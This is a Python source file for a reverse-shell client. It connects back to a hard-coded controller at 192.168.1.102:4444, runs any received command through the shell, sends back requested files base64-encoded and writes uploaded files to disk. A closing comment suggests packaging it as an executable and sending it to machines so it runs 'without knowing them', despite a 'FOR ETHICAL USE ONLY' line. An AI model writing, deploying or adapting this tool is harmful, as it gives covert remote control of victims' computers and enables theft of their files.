import socket
import json
import subprocess
import os
import base64
import time

def server(ip, port):
    """
    Connects to the listening server. Retries on failure.
    """
    global connection
    # Create a socket object
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            # Attempt to connect to the server
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            # If the server is not ready, wait 5 seconds and try again
            time.sleep(5)

def send(data):
    """
    Serializes data to JSON and sends it to the server.
    """
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def receive():
    """
    Receives and deserializes JSON data from the server.
    """
    json_data = ''
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    """
    The main execution loop for the client. Waits for and executes commands.
    """
    while True:
        try:
            # Wait to receive a command from the server
            command = receive()

            if command == 'exit':
                break
            elif command[:2] == 'cd' and len(command) > 1:
                # Change the current working directory
                os.chdir(command[3:])
            elif command[:8] == 'download':
                # Handle the server's request to download a file from us
                try:
                    with open(command[9:], 'rb') as f:
                        # Read file, encode to base64, decode to string, and send
                        send(base64.b64encode(f.read()).decode('utf-8'))
                except FileNotFoundError:
                    # If the file doesn't exist, send an error message
                    send(f"[-] Error: File not found on client: {command[9:]}")
            elif command[:6] == 'upload':
                # Handle receiving an uploaded file from the server
                with open(command[7:], 'wb') as f:
                    file_data = receive()
                    if file_data:
                        f.write(base64.b64decode(file_data))
            else:
                # For all other commands, execute them in the shell
                process = subprocess.Popen(command, shell=True,
                                           stdout=subprocess.PIPE,
                                           stdin=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           universal_newlines=True)
                # Read the output and any errors
                result = process.stdout.read() + process.stderr.read()
                send(result)
        except Exception:
            # If any error occurs, just continue the loop
            continue

    # Close the connection when the loop breaks
    connection.close()

# --- Start the client ---
# Replace '192.168.1.102' with the IP address of the computer running server.py
#FOR ETHICAL USE ONLY

#we can put the server system ip below and make this code executable file and sent to our client systems without knowing them by doing that this code will run in the client systems and in the server system we can run the server code with the IP 0.0.0.0 
#THE SERVER AND CLIENTS SHOULD BE IN THE SAME NETWORK
server('192.168.1.102', 4444)
run()
